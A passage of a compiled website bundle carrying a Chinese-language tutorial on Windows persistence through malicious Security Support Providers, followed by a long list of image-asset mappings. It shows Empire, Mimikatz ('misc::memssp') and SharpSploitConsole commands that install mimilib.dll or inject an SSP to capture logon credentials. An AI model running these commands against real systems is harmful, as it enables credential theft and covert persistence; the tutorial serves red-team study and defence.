C:\\Windows\\System32\\\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:" \u5c06mimilib.dll\u590d\u5236\u5230System32",src:s(6533).A+"",width:"691",height:"157"})}),"\n",(0,r.jsx)(n.p,{children:"\u7531\u4e8eEmpire\u5305\u542b\u4e00\u4e2a\u6a21\u5757\uff0c\u8be5\u8fc7\u7a0b\u53ef\u4ee5\u81ea\u52a8\u8fdb\u884c\uff0c\u8be5\u6a21\u5757\u5c06\u81ea\u52a8\u5c06DLL\u6587\u4ef6\u590d\u5236\u5230System32\u5e76\u521b\u5efa\u6ce8\u518c\u8868\u9879\u3002\u552f\u4e00\u7684\u8981\u6c42\u662f\u5728\u4e3b\u673a\u4e0a\u8bbe\u7f6emimilib.dll\u6587\u4ef6\u7684\u8def\u5f84\u3002"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:"usemodule persistence/misc/install_ssp*\nset Path C:\\Users\\Administrator\\mimilib.dll\nexecute\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:" Empire SSP\u5b89\u88c5",src:s(69552).A+"",width:"948",height:"249"})}),"\n",(0,r.jsx)(n.p,{children:"Empire\u8fd8\u652f\u6301\u53ef\u4ee5\u6267\u884c\u81ea\u5b9a\u4e49Mimikatz\u547d\u4ee4\u7684\u811a\u672c\u3002"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:"usemodule credentials/mimikatz/command\nset Command misc::memssp\nexecute\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"Mimikatz \u2013 SSP\u547d\u4ee4",src:s(63015).A+"",width:"840",height:"185"})}),"\n",(0,r.jsx)(n.p,{children:"Empire\u8fd8\u652f\u6301\u5728\u8fdb\u7a0b\u7684\u5185\u5b58\u4e2d\u6ce8\u5165\u6076\u610fSSP\u3002\u4e0b\u9762\u7684\u6a21\u5757\u5c06\u8c03\u7528Mimikatz\u811a\u672c\u5e76\u76f4\u63a5\u6267\u884cmemssp\u547d\u4ee4\uff0c\u4f5c\u4e3a\u4f7f\u8be5\u6280\u672f\u81ea\u52a8\u5316\u7684\u53e6\u4e00\u79cd\u65b9\u6cd5\u3002"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:"usemodule persistence/misc/memssp*\nexecute\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"Empire \u2013 memssp",src:s(55968).A+"",width:"772",height:"182"})}),"\n",(0,r.jsx)(n.h3,{id:"sharpsploitconsole",children:"SharpSploitConsole"}),"\n",(0,r.jsxs)(n.p,{children:["Mimikatz\u5df2\u96c6\u6210\u5230",(0,r.jsx)(n.a,{href:"https://github.com/anthemtotheego/SharpSploitConsole",children:"SharpSploitConsole\u4e2d"}),"\uff0c\u8be5\u5e94\u7528\u7a0b\u5e8f\u65e8\u5728\u4e0e",(0,r.jsx)(n.a,{href:"https://twitter.com/cobbr_io/",children:"Ryan Cobb"}),"\u53d1\u5e03\u7684",(0,r.jsx)(n.a,{href:"https://github.com/cobbr/SharpSploit",children:"SharpSploit"}),"\u8fdb\u884c\u4ea4\u4e92\u3002SharpSploit\u662f\u4e00\u4e2a.NET\u540e\u671f\u5f00\u53d1\u5e93\uff0c\u5177\u6709\u4e0ePowerSploit\u7c7b\u4f3c\u7684\u529f\u80fd\u3002\u5f53\u524d\uff0cSharpSploitConsole\u901a\u8fc7Mimikatz\u6a21\u5757\u652f\u6301\u5185\u5b58\u6280\u672f\u3002"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:"SharpSploitConsole_x64.exe Interact\nMimi-Command misc::memssp\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:s(75206).A+"",width:"1024",height:"580"})}),"\n",(0,r.jsx)(n.h2,{id:"\u53c2\u8003\u94fe\u63a5",children:"\u53c2\u8003\u94fe\u63a5"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"https://mp.weixin.qq.com/s/MKN5JOiOg-Iwqztfmn2P7g",children:"\u5e72\u8d27 | \u6700\u5168Windows\u6743\u9650\u7ef4\u6301\u603b\u7ed3"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"https://www.cnblogs.com/xiaozi/p/11798030.html",children:"Window\u6743\u9650\u7ef4\u6301\uff08\u4e00\uff09\uff1a\u6ce8\u518c\u8868\u8fd0\u884c\u952e"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"https://www.cnblogs.com/xiaozi/p/11797078.html",children:"Window\u6743\u9650\u7ef4\u6301\uff08\u4e8c\uff09\uff1a\u8ba1\u5212\u4efb\u52a1"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"https://www.cnblogs.com/xiaozi/p/11815957.html",children:"Window\u6743\u9650\u7ef4\u6301\uff08\u4e09\uff09\uff1a\u670d\u52a1"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"https://www.cnblogs.com/xiaozi/p/11833435.html",children:"Window\u6743\u9650\u7ef4\u6301\uff08\u56db\uff09\uff1a\u5feb\u6377\u65b9\u5f0f\u4fee\u6539"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"https://www.cnblogs.com/xiaozi/p/11833495.html",children:"Window\u6743\u9650\u7ef4\u6301\uff08\u4e94\uff09\uff1a\u5c4f\u5e55\u4fdd\u62a4\u7a0b\u5e8f"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"https://www.cnblogs.com/xiaozi/p/11833583.html",children:"Window\u6743\u9650\u7ef4\u6301\uff08\u516d\uff09\uff1aBITS Jobs"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"https://www.cnblogs.com/xiaozi/p/11834327.html",children:"Window\u6743\u9650\u7ef4\u6301\uff08\u4e03\uff09\uff1a\u5b89\u5168\u652f\u6301\u63d0\u4f9b\u8005"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"https://www.cnblogs.com/xiaozi/p/11834403.html",children:"Window\u6743\u9650\u7ef4\u6301\uff08\u516b\uff09\uff1a\u65f6\u95f4\u670d\u52a1\u5668"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"https://www.cnblogs.com/xiaozi/p/11834481.html",children:"Window\u6743\u9650\u7ef4\u6301\uff08\u4e5d\uff09\uff1a\u7aef\u53e3\u76d1\u89c6\u5668"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"https://www.cnblogs.com/xiaozi/p/11834533.html",children:"Window\u6743\u9650\u7ef4\u6301\uff08\u5341\uff09\uff1aNetsh Helper DLL"})}),"\n"]})]})}function h(e={}){const{wrapper:n}={...(0,t.R)(),...e.components};return n?(0,r.jsx)(n,{...e,children:(0,r.jsx)(o,{...e})}):o(e)}},31341:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/894761-20191111140023331-952117864-25bbf5e466a8ef3af0be0ea7cee9a0f3.png"},32070:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/image-20210706205811834-f0504b4a49be54705788d04235ffd4ca.png"},33171:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/894761-20191105133636713-274677289-1aedbd34240e4f3b18bb70f810a71c79.png"},33277:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/894761-20191111134635629-24445574-32ea50a46bf5fd3b6e53a3f40032870a.png"},33478:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/894761-20191111133654275-293344594-940286a40a3f70e617050a3cfa43e23d.png"},34480:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/894761-20191105134849170-772894554-6b9d55d6969a1f22a367c423340c925c.png"},36674:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/894761-20191111140147135-1226211952-917c42155626e79def2fa7e8689b4597.png"},37412:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/640-20210706171822352-9ccb1899d6f7dc2a2a19a10a379995c1.png"},37544:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/894761-20191111110318972-2018078810-441da73d9c1f6580efd2350934c7b138.png"},37896:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/894761-20191105135405635-783186089-119e12e0122396e88b6dd4fcd8974f29.png"},39819:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/894761-20191111140809726-1480702117-d249d0718b28cea95cb1af9df74f5616.png"},40859:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/640-20210706171834679-f66f88bd37a6f243fd5b8b310806a7cb.png"},41866:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/image-20210706205602898-560f2edf10ffd5b01c68058d7aed04fd.png"},41880:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/894761-20191111103333103-972955603-494a277f42dcdcdc403e11dac4d99222.png"},42943:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/894761-20191111103457702-2132720686-43cc73f6a1fab18b5fa627ef79b66e4a.png"},43390:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/894761-20191111134730038-745714950-6abd727127edcda2b8cc15ba1c64bdb9.png"},46290:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/894761-20170929234953919-492550722-8c519111d7e2d2f4f7a208bc2c7297b5.png"},48920:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/894761-20191111133731269-394907794-045fe142500472e91fd757648687bcff.png"},49143:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/image-20210714142109258-2ce12f87eb79470c4f03117d0b28ed49.png"},49621:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/894761-20191105134658860-1075251955-d0642dadc4b9742e46d13fb2cbaf690a.png"},49738:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/894761-20191111140516717-991869726-72ab9425d2e0e8ec418dae2aa3b17383.png"},50465:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/894761-20191111133557520-730469174-8ed1629c9c77290c6f582913921e56ee.png"},51300:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/640-20210706171727174-6158f20d1cbd46ca734379c9447a310d.png"},52524:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/image-20210714113433194-223a33022255b1af26f66c8f801f9ca5.png"},52642:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/894761-20191111133747470-1690785944-af5da7ea6e584a3541f464c3156806e5.png"},52954:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/894761-20191105134518276-146109006-85858a5b1c9d936ec1d9b724f0a8139e.png"},55671:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/image-20210706205944131-5444943494fe30b74dca95ae4cdce6cd.png"},55968:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/894761-20191111133913930-1307143695-f7ebb5d8c1b8e947b3ffab848faf481d.png"},56197:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/894761-20191105134604486-306364663-a88a7d5f4842f76895efb880a05ebed5.png"},59614:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/894761-20191111110205620-1082423963-6ecbd06a89166a87ee6b789fd168df9a.png"},60123:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/894761-20191111134844577-2033208265-2d780dd9319e824478a2a157143b955c.png"},60991:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/640-20210706152521828-de415a424a115e2605a27d0adef266bb.png"},62238:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/image-20210706205840902-c79c8fb50ffb139063146a9f99f1cf6d.png"},63015:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/894761-20191111133858316-1276814399-bfce5be63db16847e510718f2254226e.png"},64786:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/894761-20191111140618646-1764925445-68b26ab71815bf2532baab4b1bb76e67.png"},66331:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/894761-20191111103555784-447693490-01429c10dd5f2e853f9462e12a544b34.png"},67239:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/894761-20191111103234521-1980646915-8e3728795f0aaabf00aede9615bfdb60.png"},68185:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/640-20210706165717690-62a393a38725d070fd18655ab8a418b2.png"},68789:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/894761-20191111134557826-1438345258-df31420f6648039d112f6785229592d1.png"},69194:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/894761-20191111133714579-1576487799-8e613636861bcb682b86b817b1af7091.png"},69552:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/894761-20191111133839474-1905556008-52916657c081e6c5aec1d3436a1963d6.png"},70886:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/894761-20191111103410255-1737326702-cd02fc42d56c2a87c9c60d08ccd964ce.png"},72011:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/894761-20191105134540836-1763287960-f7e10e70f0409ba879d8f2b94e2258b3.png"},72110:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/894761-20191111103529714-2117172312-999502d571924efe741c637e53737865.png"},72941:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/894761-20191111140547648-995495170-b7d1829a73afd15003fc0b33be33e7fa.png"},75206:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/894761-20191111134004640-661005304-ac1d999e7777ac97ef8f600f04dd0f93.png"},75832:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/894761-20191105133754285-890511327-53f99896b96222dac5225cb7a6d4a2e3.png"},76316:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/894761-20191111140925305-901798714-f24020808774a82fc584aa8bf1a71599.png"},78499:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/640-20210706204240545-4c9bc0f3f98c9a51524953e3e5dbdce7.png"},79778:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/894761-20191111140738377-147276156-0a46ce7a49cacc7bc4c20522fb905fd3.png"},81857:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/894761-20191111140042168-154593214-05542759a5c05c505e665f6e4a3ed89e.png"},82636:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/894761-20191111133629156-1972426718-be98a2a7ee1d3b150cfd4881c4c2fc5a.png"},83369:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/894761-20191105134006738-1014637740-55f250e8c8b14d0f2bbc6d2df8021003.png"},84741:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/image-20210714112824723-be3b629692525be6bbf75d5d7b5f41cd.png"},84841:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/894761-20191111133929436-353413364-03b53451e99d0f0b818371684858afdc.png"},85563:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/894761-20191111140719211-121162434-71841a35d55665a0338596c67dd38fad.png"},85913:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/894761-20191105134710750-575089410-386aae096daf36b1628b5ef4541c72d8.png"},85957:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/894761-20191111134901319-906395250-e02fb7f0ed304eaa7b83e64aacc33a1c.png"},86965:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/640-20210706202127819-3ef266e7a0d6572b03f66f339db4c654.png"},92584:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/894761-20191111135053322-1257398998-4b5c51d91dc21d12a881701683ff09e8.png"},92671:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/image-20210714112339757-1ac73fb41b4115d38281120706310e5e.png"},92733:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/1592231803832859-648a25ff292571a045989f74bc314ab1.png"},93240:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/894761-20191111134810603-1074824702-1bf8deff9f5ffef9ab7ebb62d5c5e5d1.png"},93677:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/894761-20191111140129246-835720952-82e92ea45ebeff43f794ab4a2353ce48.png"},94083:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/894761-20191105134352525-1888668860-ddb8f4f68270ad043201a594df59150b.png"},95187:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/image-20210706205754396-0dc01bd9a6717dd27531948bde1a0ac7.png"},95370:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/894761-20191107214402611-556595327-2b0bc9ddef97ab80887ebfa3f15a47be.png"},95908:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/image-20210714112646184-879ecafc0e7272858bb312c8627af6d2.png"},97208:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/894761-20191111110227491-23710429-02d5e198b96c34378287ffd30af73235.png"},97470:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/894761-20191111140827595-950746634-dba4b7da8a6fc4dde77cb2bbff78ea6d.png"},97875:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/640-20210706171936609-218e6e3a0bfab8ea2e67b8d491bc4c9f.png"},99131:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/image-20210706153656188-226510fbe53104fac647c1d2a19c5193.png"},99909:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/894761-20191111140102723-1846881912-5e9bea8d57b5be14cb4d8608fa23e94a.png"}}]);